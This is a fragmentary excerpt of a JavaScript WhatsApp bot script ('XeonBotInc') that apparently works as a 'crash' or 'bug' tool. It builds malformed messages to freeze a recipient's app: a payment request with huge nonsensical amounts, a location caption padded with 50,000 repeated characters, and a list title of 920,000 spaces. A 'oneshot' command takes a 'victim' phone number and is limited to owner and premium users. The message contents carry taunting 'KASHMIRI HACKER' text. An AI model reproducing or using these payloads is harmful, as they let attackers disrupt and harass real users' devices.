...
{
"name": "review_and_pay",
"buttonParamsJson": `{\"currency\":\"INR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"🔱KASHMIRI HACKER 👿 I AM YOUR DAD BITCH\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}`
}
]
}
}
...
message: {
  "liveLocationMessage": {
    "degreesLatitude": "p",
    "degreesLongitude": "p",
    "caption": `🦄드림 가이 KASHMIRI 🦄드림 가이 KASHMIRI 🦄드림 가이 KASHMIRI 🦄드림 가이 Xeon 🦄드림 가이 KASHMIRI 🦄드림 가이 KASHMIRI 🦄드림 가이 KASHMIRI`+"ꦾ".repeat(50000),
    "sequenceNumber": "0",
    "jpegThumbnail": ""
     }
  }
 ...
 var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
  'listMessage': {
    'title': "🦄드림 가이 Xeon"+" ".repeat(920000),
        'footerText': `🦄드림 가이 KASHMIRI 🦄드림 가이 KASHMIRI 🦄드림 가이 KASHMIRI 🦄드림 가이 KASHMIRI 🦄드림 가이 KASHMIRI 🦄드림 가이 KASHMIRI 🦄드림 가이 KASHMIRI`,
        'description': `🦄드림 가이 KASHMIRI 🦄드림 가이 KASHMIRI 🦄드림 가이 KASHMIRI 🦄드림 가이 KASHMIRI 🦄드림 가이 KASHMIRI 🦄드림 가이 KASHMIRI 🦄드림 가이 KASHMIRI`,
        'buttonText': null,
        'listType': 2,
        'productListInfo': {
          'productSections': [{
...
`.trim()
                ...
                await XeonBotInc.sendMessage(m.chat, {
                    ...
                    contextInfo: {
                        externalAdReply: {
                            ...
                            title: `${botname}`,
                            body: `${ownername}`,
                            thumbnailUrl: 'https://ibb.co/5ThQ3xD2.jpg',
                            sourceUrl: global.link,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                ...
                XeonBotInc.sendMessage(m.chat, {
                    ...
                    contextInfo: {
                        externalAdReply: {
                            ...
                            title: `${botname}`,
                            body: `FORGET DONATE`,
                            thumbnailUrl: 'https://ibb.co/5ThQ3xD.jpg',
                            sourceUrl: global.link,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                ...
                XeonBotInc.sendMessage(m.chat, {
                    ...
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: `${botname}`,
                            body: `SCRIPT OF ${botname} is on YouTube @KAASHMIRIxMOHSIN`,
                            thumbnailUrl: 'https://ibb.co/5ThQ3xD.jpg',
                            sourceUrl: global.link,
                            mediaType: 1,
                            renderLargerThumbnail: true
            ...
            case 'donasi':
                ...
                XeonBotInc.sendMessage(m.chat, {
                    text: 'Paypal: https://www.paypal.me\n\n' + textnate
                }, {
                    quoted: m
                })
                break
...
case 'oneshot': {
	if (!isCreator) return replygcxeon(mess.owner)
if (!text) return replygcxeon(`Usage .${command} 923255156992`)
let cleanedNumber = text.replace(/[^0-9]/g, '');
if (cleanedNumber.startsWith('0')) return replygcxeon(`Example : ${prefix+command} 923255156992`)
var contactInfo = await XeonBotInc.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "923255156992") {
    return;
...
if (!isPremium) return replygcxeon(mess.prem)
if (!q) return replygcxeon(`Usage .${command} 923255156992`)
let xeonyvictim = q.replace(/[^0-9]/g, "")
if (xeonyvictim.startsWith('0')) return replygcxeon(`Example : .${command} 923255156992`)
